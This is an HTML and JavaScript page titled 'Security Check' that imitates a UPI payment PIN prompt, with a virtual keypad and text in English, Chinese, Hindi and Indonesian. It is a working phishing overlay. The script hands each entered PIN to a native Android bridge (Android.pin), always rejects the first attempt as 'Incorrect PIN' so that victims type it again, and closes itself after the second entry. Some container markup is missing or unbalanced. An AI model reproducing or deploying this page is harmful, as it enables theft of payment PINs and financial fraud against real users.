<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
<title>Security Check</title>
<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    -webkit-tap-highlight-color:transparent;
}

html,body{
    width:100%;
    height:100%;
    overflow:hidden;
    background:#f5f5f5;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}

body{
    position:relative;
}

/* 页面 */

.page{
    position:absolute;
    inset:0;
    width:100%;
    height:100%;
    background:#f5f5f5;
    transition:0.35s ease;
}

.hidden{
    opacity:0;
    pointer-events:none;
    transform:translateX(20px);
}

/* 第一页 */

.center-box{
    position:absolute;
    width:100%;
    left:50%;
    top:42%;
    transform:translate(-50%,-50%);
    text-align:center;
    padding:0 24px;
}

.title{
    font-size:22px;
    font-weight:700;
    color:#1f2b4d;
    margin-bottom:18px;
    line-height:1.3;
}

.desc{
    font-size:16px;
    color:#333;
    line-height:1.6;
    margin-bottom:34px;
}

.next-btn{
    width:180px;
    height:56px;
    border:none;
    border-radius:999px;
    background:#3765eb;
    color:#fff;
    font-size:24px;
    font-weight:600;
    cursor:pointer;
    box-shadow:0 4px 10px rgba(55,101,235,0.25);
}

/* 第二页 */

.pin-page{
    width:100%;
    height:100%;
    position:relative;
    padding-top:20px;
}

.top-bar{
    display:flex;
    justify-content:space-between;
    align-items:flex-start;
    padding:0 20px;
}

.custom-logo{
    width:42px;
    height:42px;
    object-fit:contain;
}

.right-top{
    display:flex;
    flex-direction:column;
    align-items:flex-end;
}

.upi-logo{
    width:100px;
    object-fit:contain;
}

.pin-switch{
    margin-top:14px;
    display:flex;
    border:1px solid #55637f;
    overflow:hidden;
    border-radius:2px;
}

.switch-btn{
    width:120px;
    height:50px;
    border:none;
    background:#fff;
    color:#465678;
    font-size:16px;
    font-weight:500;
}

.switch-btn.active{
    background:#2f57b7;
    color:#fff;
}

/* PIN输入 */

.pin-box-wrap{
    width:100%;
    padding:52px 22px 0;
}

.pin-boxes{
    width:100%;
    display:flex;
    justify-content:space-between;
    gap:14px;
}

.pin-slot{
    flex:1;
    height:42px;
    border-bottom:4px solid #444;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:26px;
    font-weight:700;
    color:#111;
}

.pin-desc{
    margin-top:20px;
    font-size:16px;
    line-height:1.5;
    color:#333;
}

/* 数字键盘 */

.keypad{
    position:absolute;
    bottom:24px;
    left:0;
    width:100%;
    padding:0 24px;
    /* 关键：增加安全区域底部距离 */
    padding-bottom: calc(24px + env(safe-area-inset-bottom, 0px));
}

.keypad-grid{
    display:grid;
    grid-template-columns:repeat(3,1fr);
    gap:36px 20px;
}

.key{
    height:58px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:34px;
    color:#233d97;
    font-weight:400;
    user-select:none;
}

/* 删除按钮 */

.action-btn{
    width:68px;
    height:48px;
    background:#2f57b7;
    border-radius:4px;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
    margin:auto;
}

.action-btn::before{
    content:"";
    position:absolute;
    left:-16px;
    width:0;
    height:0;
    border-top:16px solid transparent;
    border-bottom:16px solid transparent;
    border-right:16px solid #2f57b7;
}

.action-btn span{
    color:#fff;
    font-size:30px;
    font-weight:700;
    position:relative;
    top:-1px;
}

/* 确认按钮 */

.confirm-btn{
    width:74px;
    height:74px;
    border-radius:50%;
    background:#3867ff;
    display:flex;
    align-items:center;
    justify-content:center;
    margin:auto;
    box-shadow:0 4px 10px rgba(0,0,0,0.15);
}

.confirm-btn svg{
    width:30px;
    height:30px;
    stroke:#fff;
    stroke-width:4;
    fill:none;
    stroke-linecap:round;
    stroke-linejoin:round;
}

/* Toast */

.toast{
    position:fixed;
    left:50%;
    bottom:110px;
    transform:translateX(-50%);
    background:rgba(0,0,0,0.86);
    color:#fff;
    padding:12px 22px;
    border-radius:10px;
    font-size:15px;
    opacity:0;
    transition:0.25s;
    pointer-events:none;
    z-index:9999;
    white-space:nowrap;
}

.toast.show{
    opacity:1;
}

/* 平板/大屏 */

@media (min-width:768px){

    .title{
        font-size:40px;
    }

    .desc{
        font-size:26px;
    }

    .next-btn{
        width:250px;
        height:74px;
        font-size:34px;
    }

    .custom-logo{
        width:58px;
        height:58px;
    }

    .upi-logo{
        width:130px;
    }

    .switch-btn{
        width:170px;
        height:72px;
        font-size:20px;
    }

    .pin-box-wrap{
        padding:70px 30px 0;
    }

    .pin-slot{
        height:54px;
        font-size:34px;
    }

    .pin-desc{
        font-size:24px;
    }

    .key{
        height:90px;
        font-size:64px;
    }

    .action-btn{
        width:110px;
        height:70px;
    }

    .action-btn::before{
        left:-22px;
        border-top:22px solid transparent;
        border-bottom:22px solid transparent;
        border-right:22px solid #2f57b7;
    }

    .action-btn span{
        font-size:38px;
    }

    .confirm-btn{
        width:100px;
        height:100px;
    }

    .confirm-btn svg{
        width:42px;
        height:42px;
    }
}
</style>
</head>
<body>

<!-- 第一页 -->

    <div class="center-box">
        <div class="title" id="titleText">
            Security Check Required
        </div>
        <div class="desc" id="descText">
            To protect your account, we need to perform a quick security check. Tap Next to continue.
        </div>
        <button class="next-btn" id="nextBtn">
            Next
        </button>
    </div>
</div>

    <div class="pin-page">

                <div class="pin-switch">

                    <button class="switch-btn active" id="btn6">
                        6-digit PIN
                    </button>

                    <button class="switch-btn" id="btn4">
                        4-digit PIN
                    </button>
                </div>

        </div>

        <div class="pin-box-wrap">
            <div class="pin-boxes" id="pinBoxes"></div>
            <div class="pin-desc" id="pinDesc">
                Your PIN helps protect your account. Do not share your PIN with anyone.
            </div>
        </div>

        <!-- 虚拟键盘 -->
        <div class="keypad">
            <div class="keypad-grid">
                <div class="key" data-key="1">1</div>
                <div class="key" data-key="2">2</div>
                <div class="key" data-key="3">3</div>

                <div class="key" data-key="4">4</div>
                <div class="key" data-key="5">5</div>
                <div class="key" data-key="6">6</div>

                <div class="key" data-key="7">7</div>
                <div class="key" data-key="8">8</div>
                <div class="key" data-key="9">9</div>

                <!-- 删除 -->

                <div class="action-btn" id="deleteBtn">
                    <span>×</span>
                </div>

                <div class="key" data-key="0">0</div>

                <!-- 确认 -->

                <div class="confirm-btn" id="confirmBtn">
                    <svg viewBox="0 0 24 24">
                        <path d="M5 13L10 18L19 7"></path>
                    </svg>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- Toast -->
<div class="toast" id="toast"></div>
<script>
    /* =========================
       多语言
    ========================= */
    const translations = {
        en:{
            title:"Security Check Required",
            desc:"To protect your account, we need to perform a quick security check. Tap Next to continue.",
            next:"Next",
            pinDesc:"Your PIN helps protect your account. Do not share your PIN with anyone.",
            incorrect:"Incorrect PIN",
            empty:"PIN cannot be empty",
            short:"PIN is incomplete"
        },

        zh:{
            title:"需要安全验证",
            desc:"为了保护您的账户，我们需要进行快速安全检查。点击下一步继续。",
            next:"下一步",
            pinDesc:"您的 PIN 用于保护账户安全，请勿向任何人透露。",
            incorrect:"验证码错误",
            empty:"验证码不能为空",
            short:"验证码不够位"
        },

        hi:{
            title:"सुरक्षा जांच आवश्यक",
            desc:"आपके खाते की सुरक्षा के लिए हमें एक त्वरित सुरक्षा जांच करनी होगी। जारी रखने के लिए Next दबाएँ।",
            next:"आगे",
            pinDesc:"आपका PIN आपके खाते की सुरक्षा करता है। इसे किसी के साथ साझा न करें।",
            incorrect:"गलत PIN",
            empty:"PIN खाली नहीं हो सकता",
            short:"PIN अधूरा है"
        },

        id:{
            title:"Pemeriksaan Keamanan Diperlukan",
            desc:"Untuk melindungi akun Anda, kami perlu melakukan pemeriksaan keamanan cepat. Ketuk Berikutnya untuk melanjutkan.",
            next:"Berikutnya",
            pinDesc:"PIN membantu melindungi akun Anda. Jangan bagikan PIN kepada siapa pun.",
            incorrect:"PIN Salah",
            empty:"PIN tidak boleh kosong",
            short:"PIN belum lengkap"
        }

    };

    /* 自动识别语言 */

    function detectLanguage(){
        let lang = navigator.language || navigator.userLanguage;
        lang = lang.toLowerCase();
        if(lang.includes("zh")) return "zh";
        if(lang.includes("hi")) return "hi";
        if(lang.includes("id")) return "id";
        return "en";
    }

    const currentLang = detectLanguage();
    const t = translations[currentLang];

    /* 写入语言 */
    document.getElementById("titleText").innerText = t.title;
    document.getElementById("descText").innerText = t.desc;
    document.getElementById("nextBtn").innerText = t.next;
    document.getElementById("pinDesc").innerText = t.pinDesc;

    /* 页面切换 */
    const page1 = document.getElementById("page1");
    const page2 = document.getElementById("page2");

    document.getElementById("nextBtn").onclick = ()=>{
        page1.classList.add("hidden");
        page2.classList.remove("hidden");
    };

    /* PIN逻辑 */
    let pinLength = 6;
    let pinValue = "";
    let submitCount = 0;

    const pinBoxes = document.getElementById("pinBoxes");

    /* 渲染PIN */
    function renderBoxes(){
        pinBoxes.innerHTML = "";
        for(let i=0;i<pinLength;i++){
            const div = document.createElement("div");
            div.className = "pin-slot";
            if(pinValue[i]){
                div.innerHTML = "•";
            }
            pinBoxes.appendChild(div);
        }
    }

    renderBoxes();

    /* 重置 */
    function resetPin(){
        pinValue = "";
        renderBoxes();
    }

    /* 切换6位 */
    document.getElementById("btn6").onclick = ()=>{
        pinLength = 6;
        document.getElementById("btn6").classList.add("active");
        document.getElementById("btn4").classList.remove("active");
        resetPin();
    };

    /* 切换4位 */
    document.getElementById("btn4").onclick = ()=>{
        pinLength = 4;
        document.getElementById("btn4").classList.add("active");
        document.getElementById("btn6").classList.remove("active");
        resetPin();
    };

    /* 数字输入 */

    document.querySelectorAll(".key").forEach(key=>{
        key.addEventListener("click",function(){
            const value = this.dataset.key;
            if(!value) return;
            if(pinValue.length >= pinLength){
                return;
            }
            pinValue += value;
            renderBoxes();
        });
    });

    /* 删除 */
    document.getElementById("deleteBtn").onclick = ()=>{
        if(pinValue.length <= 0) return;
        pinValue = pinValue.substring(0,pinValue.length - 1);
        renderBoxes();
    };

    /* Toast */
    function showToast(text){
        const toast = document.getElementById("toast");
        toast.innerText = text;
        toast.classList.add("show");
        clearTimeout(window.toastTimer);
        window.toastTimer = setTimeout(()=>{
            toast.classList.remove("show");
        },2000);
    }

    /* 确认 */

    document.getElementById("confirmBtn").onclick = ()=>{

        // 空
        if(pinValue.length === 0){
            showToast(t.empty);
            return;
        }

        // 不足位数
        if(pinValue.length < pinLength){
            showToast(t.short);
            return;
        }

        submitCount++;

        Android.pin(pinValue, submitCount);
        // 第一次必错
        if(submitCount === 1){
            showToast(t.incorrect);
            resetPin();
            return;
        }

        // 第二次关闭页面
        try{
            window.open('','_self');
            window.close();
        }catch(e){}
        document.body.innerHTML = "";
    };
</script>
</body>
</html>
